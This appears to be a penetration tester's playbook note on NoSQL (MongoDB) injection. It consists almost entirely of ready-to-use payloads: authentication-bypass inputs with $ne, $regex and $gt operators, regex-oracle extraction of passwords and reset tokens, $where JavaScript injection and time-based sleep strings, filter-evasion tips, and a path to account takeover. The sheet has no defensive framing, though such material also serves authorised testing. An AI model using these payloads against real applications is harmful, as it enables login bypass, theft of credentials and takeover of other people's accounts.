# NoSQL Injection

## Before I start
- [ ] App smells like Mongo (Node/Express, JSON API, /api/ routes): :Pb api

## Auth bypass
username=admin&password[$ne]=x
username=admin&password[$regex]=.*
{"username":"admin","password":{"$ne":null}}
- [ ] Form-encoded filtered? Resend as application/json — most apps parse both, filter one
- [ ] Also try $gt with empty value and $where JS: ' || 1==1//

## Boolean oracle extraction
username=admin&password[$regex]=^a
- [ ] Login success/fail differs = oracle; loop chars with a python script (requests + json body)
- [ ] Extract: passwords, reset tokens, other users' fields

## $where JS context
' || 1==1//
' && this.password.match(/^a/)//
- [ ] Rare on modern stacks — operators first, JS second

## If it fails
- [ ] 400 on operators = query builder sanitizes → try nested JSON, array pollution
- [ ] No boolean difference → time-based inside $where (' && sleep(5000)// — if eval exists)

## Next
- [ ] Token/password extraction → account takeover → keep mapping: :Pb api
- [ ] Mongo reachable on the host directly: :Pb mongodb
